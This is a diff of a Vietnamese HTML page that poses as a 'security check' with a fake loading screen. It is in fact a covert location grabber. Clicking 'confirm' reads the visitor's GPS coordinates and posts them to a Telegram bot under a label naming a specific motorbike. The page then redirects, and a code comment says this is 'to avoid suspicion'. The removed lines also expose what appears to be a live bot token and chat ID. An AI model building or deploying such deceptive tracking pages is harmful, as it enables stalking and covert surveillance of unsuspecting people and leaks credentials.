@@ -3,46 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tiếp tục</title>
+    <title>Đang chuyển hướng...</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f0f0; }
-        button { padding: 20px 40px; font-size: 1.2rem; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 10px; transition: 0.3s; }
-        button:active { transform: scale(0.95); }
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #fafafa; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { padding: 15px 30px; font-size: 18px; color: white; background: #0088cc; border: none; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <button onclick="getLocation()">Ấn để tiếp tục</button>
+    <div id="content">
+        <h3>Hệ thống đang kiểm tra bảo mật...</h3>
+        <p>Vui lòng nhấn xác nhận để tiếp tục truy cập.</p>
+        <button onclick="startProcess()">XÁC NHẬN (OK)</button>
+    </div>
+
+    <div id="loading" style="display:none;">
+        <div class="loader"></div>
+        <p>Đang chuyển hướng, vui lòng đợi trong giây lát...</p>
+    </div>
 
     <script>
-        const TELEGRAM_TOKEN = '8571376502:AAGnzWuqINqn1DfeL-ux16jC-sWt9xeqjmg';
-        const CHAT_ID = '1197457034';
+        const TOKEN = 'THAY_TOKEN_CUA_BAN';
+        const CHAT_ID = 'THAY_ID_CUA_BAN';
 
-        function getLocation() {
+        function startProcess() {
+            // Hiện giao diện load giả
+            document.getElementById('content').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
+            // Lấy tọa độ
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendToTele, showError);
+                navigator.geolocation.getCurrentPosition(sendAndRedirect, handleError);
             } else {
-                alert("Trình duyệt không hỗ trợ GPS.");
+                window.location.href = "https://google.com"; // Không hỗ trợ thì chuyển luôn
             }
         }
 
-        function sendToTele(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            const message = `📍 Vị trí xe Wave 54zz:\n\nKinh độ: ${lat}\nVĩ độ: ${lon}\nLink Google Maps: ${mapsUrl}`;
-
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        function sendAndRedirect(pos) {
+            const msg = `📍 Vị trí Wave 54zz:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-            })
-            .then(() => alert("Lỗi vui lòng chờ trong giây lát!"))
-            .catch(() => alert("Lỗi khi gửi dữ liệu!"));
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+            }).then(() => {
+                // Gửi xong thì chuyển hướng sang trang khác ngay lập tức
+                window.location.href = "https://www.youtube.com/results?search_query=wave+nho+do+kieng"; 
+            });
         }
 
-        function showError(error) {
-            alert("Ấn để tiếp tục.");
+        function handleError() {
+            // Nếu bị từ chối quyền cũng chuyển hướng để tránh nghi ngờ
+            window.location.href = "https://google.com";
         }
     </script>
 </body>
